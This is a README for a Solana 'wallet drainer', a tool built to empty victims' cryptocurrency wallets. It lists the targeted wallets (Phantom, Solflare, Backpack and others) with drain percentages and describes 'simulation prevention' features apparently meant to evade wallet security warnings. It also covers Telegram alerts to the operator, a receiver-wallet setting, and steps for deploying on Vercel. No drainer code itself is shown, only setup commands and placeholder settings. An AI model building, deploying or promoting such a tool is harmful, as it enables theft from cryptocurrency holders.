# Solana Wallet Drainer

A professional-grade Solana wallet drainer with support for multiple wallet types including Phantom, Solflare, Backpack, Trust Wallet, Glow, and Exodus.

## Features

- **Multi-Wallet Support**: Compatible with all major Solana wallets
- **Deep Link Integration**: Seamless mobile and desktop wallet connections
- **Patient Mode**: Extended timeouts for user interaction
- **TOCTOU Protection**: Advanced security against transaction simulation attacks
- **Telegram Integration**: Real-time notifications and logging
- **Vercel Ready**: Optimized for serverless deployment

## Supported Wallets

- **Phantom**: 95% drain with 0.0004 SOL reserve
- **Solflare**: 100% drain with 0.00094 SOL reserve
- **Backpack**: 100% drain with 0.00094 SOL reserve
- **Trust Wallet**: 100% drain with 0.00094 SOL reserve
- **Glow**: 100% drain with 0.00094 SOL reserve
- **Exodus**: 100% drain with 0.00094 SOL reserve

## Quick Start

### Local Development

1. Install dependencies:
```bash
npm install
```

2. Set up environment variables:
```bash
cp .env.example .env
# Edit .env with your configuration
```

3. Start the server:
```bash
npm start
```

### Vercel Deployment

1. Install Vercel CLI:
```bash
npm i -g vercel
```

2. Deploy:
```bash
vercel --prod
```

## Environment Variables

```env
NODE_ENV=production
RPC_URL=https://your-rpc-endpoint.com
RECEIVER_WALLET=your-receiver-wallet-address
TELEGRAM_BOT_TOKEN=your-telegram-bot-token
TELEGRAM_CHAT_ID=your-telegram-chat-id
```

## API Endpoints

- `GET /health` - Health check
- `POST /api/drainer` - Main drainer endpoint
- `POST /api/wallet-management` - Wallet management
- `POST /api/unified-drainer` - Unified drainer logic

## Architecture

- **Express.js**: Web framework
- **Solana Web3.js**: Blockchain interaction
- **CORS**: Cross-origin resource sharing
- **TOCTOU Protection**: Security layer
- **Patient Mode**: User-friendly timeouts

## Security Features

- Transaction fingerprinting
- Simulation prevention
- TOCTOU attack protection
- Rate limiting
- Input validation

## License

Private - All rights reserved
